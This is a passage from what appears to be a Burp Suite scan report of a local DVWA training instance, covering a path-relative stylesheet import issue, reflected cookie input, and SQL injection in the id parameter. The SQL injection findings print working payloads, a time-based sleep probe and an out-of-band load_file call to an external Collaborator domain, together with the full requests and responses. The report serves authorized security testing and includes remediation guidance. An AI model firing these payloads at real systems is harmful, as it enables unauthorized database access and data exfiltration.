<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/javascript/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=s2437t6rdabfc63b7v244c9f2f<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:00 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br>Content-Length: 8271<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: JavaScript Attacks :: Damn Vulnerable Web Application (DV<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/javascript/<span class="HIGHLIGHT">index.php/n4blnb/eb4ei6/yxfk11/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=s2437t6rdabfc63b7v244c9f2f<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br>Content-Length: 8271<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: JavaScript Attacks :: Damn Vulnerable Web Application (DV<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/javascript/index.php/n4blnb/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=s2437t6rdabfc63b7v244c9f2f<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br>Content-Length: 8271<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: JavaScript Attacks :: Damn Vulnerable Web Application (DV<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="24.3">24.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#24.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#25.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/javascript/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/javascript/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">xo1ylehagj</span>; PHPSESSID=s2437t6rdabfc63b7v244c9f2f<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:19 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=s2437t6rdabfc63b7v244c9f2f; path=/<br>Set-Cookie: security=low<br>Content-Length: 4157<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: JavaScript Attacks :: Damn Vulnerable Web Application (DV<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=javascript&amp;security=low<span class="HIGHLIGHT">xo1ylehagj</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=javascript&amp;security=low<span class="HIGHLIGHT">xo1ylehagj</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="25">25.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli/</span>
<br><a class="PREVNEXT" href="#24">Previous</a>
&nbsp;<a class="PREVNEXT" href="#26">Next</a>
<br>
<span class="BODH1" id="25.1">25.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00100200_sqlinjection">SQL injection</a></span>
<br><a class="PREVNEXT" href="#24.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#25.2">Next</a>
<br>
<br><span class="TEXT">There are 2 instances of this issue:
<ul>
<li><a href="#25.1.1">/dvwa/vulnerabilities/sqli/ [id parameter]</a></li>
<li><a href="#25.1.2">/dvwa/vulnerabilities/sqli/ [id parameter]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p></span>
<h2>Remediation background</h2>
<span class="TEXT"><p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul></span>
<h2>References</h2>
<span class="TEXT"><ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="25.1.1">25.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli/ [id parameter]</span>
<br><a class="PREVNEXT" href="#23.10.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#25.1.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/sqli/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The <b>id</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'+(select load_file('\\\\d4ihtshvuna4m8d9aoay4vxfy640srif9ix9kz8o.burpcollaborator.net\\qzc'))+'</b> was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.<br><br> Additionally, a single quote was submitted in the id parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the id parameter. The application took <b>20011</b> milliseconds to respond to the request, compared with <b>4</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.</span>
<h2>Remediation detail</h2>
<span class="TEXT">The application should handle errors gracefully and prevent SQL error messages from being returned in responses. </span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=285841<span class="HIGHLIGHT">'%2b(select%20load_file('%5c%5c%5c%5cd4ihtshvuna4m8d9aoay4vxfy640srif9ix9kz8o.burpcollaborator.net%5c%5cqzc'))%2b'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=k5g9ang54nnp3b44kh83f27sdo<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br></span></div>
<h2>Collaborator DNS interaction</h2>
<span class="TEXT">The Collaborator server received a DNS lookup of type AAAA for the domain name <b>d4ihtshvuna4m8d9aoay4vxfy640srif9ix9kz8o.burpcollaborator.net</b>.<br><br> The lookup was received from IP address 49.231.70.74 at 2022-Mar-11 07:35:29 UTC.</span><h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=818102<span class="HIGHLIGHT">'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=7oma6jkbb8s8uivt96l72d8515<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:07 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 616<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br>&lt;br /&gt;<br>&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught mysqli_sql_exception: <span class="HIGHLIGHT">You have an error in your SQL syntax</span>; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''818102''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11<br>Stack trace:<br>#0 <br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=818102<span class="HIGHLIGHT">''</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=7oma6jkbb8s8uivt96l72d8515<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:07 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 4</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=818102<span class="HIGHLIGHT">'%2b(select*from(select(sleep(20)))a)%2b'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=7oma6jkbb8s8uivt96l72d8515<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 4</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:07 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="25.1.2">25.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/sqli/ [id parameter]</span>
<br><a class="PREVNEXT" href="#25.1.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#26.1.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/sqli/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The <b>id</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'+(select load_file('\\\\d4ihtshvuna4m8d9aoay4vxfy640srif9ix9kz8o.burpcollaborator.net\\qzc'))+'</b> was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.<br><br> Additionally, a single quote was submitted in the id parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the id parameter. The application took <b>20011</b> milliseconds to respond to the request, compared with <b>4</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.</span>
<h2>Remediation detail</h2>
<span class="TEXT">The application should handle errors gracefully and prevent SQL error messages from being returned in responses. </span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/sqli/?id=285841<span class="HIGHLIGHT">'%2b(select%20load_file('%5c%5c%5c%5cd4ihtshvuna4m8d9aoay4vxfy640srif9ix9kz8o.burpcollaborator.net%5c%5cqzc'))%2b'</span>&amp;Submit=Submit HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=k5g9ang54nnp3b44kh83f27sdo<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/sqli/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4046<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v<br><b>...[SNIP]...</b><br></span></div>
<h2>Collaborator DNS interaction</h2>
<span class="TEXT">The Collaborator server received a DNS lookup of type AAAA for the domain name <b>d4ihtshvuna4m8d9aoay4vxfy640srif9ix9kz8o.burpcollaborator.net</b>.<br><br> The lookup was received from IP address 49.231.70.74 at 2022-Mar-11 07:35:29 UTC.</span><h2>Request 2</h2>
